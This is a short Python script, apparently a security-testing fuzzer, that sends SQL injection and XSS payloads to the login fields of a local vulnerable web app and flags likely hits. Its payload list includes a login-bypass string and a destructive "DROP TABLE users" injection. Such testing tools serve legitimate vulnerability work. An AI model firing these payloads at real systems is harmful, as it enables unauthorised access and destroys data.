import requests
import itertools

# Target Web App URL
TARGET_URL = "http://localhost/vulnerable_app.php"

# Test Payloads for SQL Injection & XSS
SQL_PAYLOADS = ["' OR '1'='1", "'; DROP TABLE users; --"]
XSS_PAYLOADS = ['<script>alert("XSS")</script>', '"><img src=x onerror=alert(1)>']

# Combine payloads for testing
PAYLOADS = SQL_PAYLOADS + XSS_PAYLOADS

# Extract input fields (simulated for this example)
INPUT_FIELDS = ["username", "password"]

# Generate test cases (mutating inputs)
def generate_test_cases():
    return [dict(zip(INPUT_FIELDS, values)) for values in itertools.product(PAYLOADS, repeat=len(INPUT_FIELDS))]

# Function to send fuzzing requests
def fuzz_web_app():
    test_cases = generate_test_cases()
    for test_input in test_cases:
        response = requests.post(TARGET_URL, data=test_input)
        analyze_response(response, test_input)

# Analyzing response for signs of vulnerabilities
def analyze_response(response, test_input):
    if "syntax error" in response.text.lower() or "mysql" in response.text.lower():
        print(f"🚨 SQL Injection Detected: {test_input}")
    elif "<script>" in response.text or "alert(1)" in response.text:
        print(f"🚨 XSS Detected: {test_input}")
    else:
        print(f"✅ No issues found for: {test_input}")

# Run the fuzzer
if __name__ == "__main__":
    fuzz_web_app()
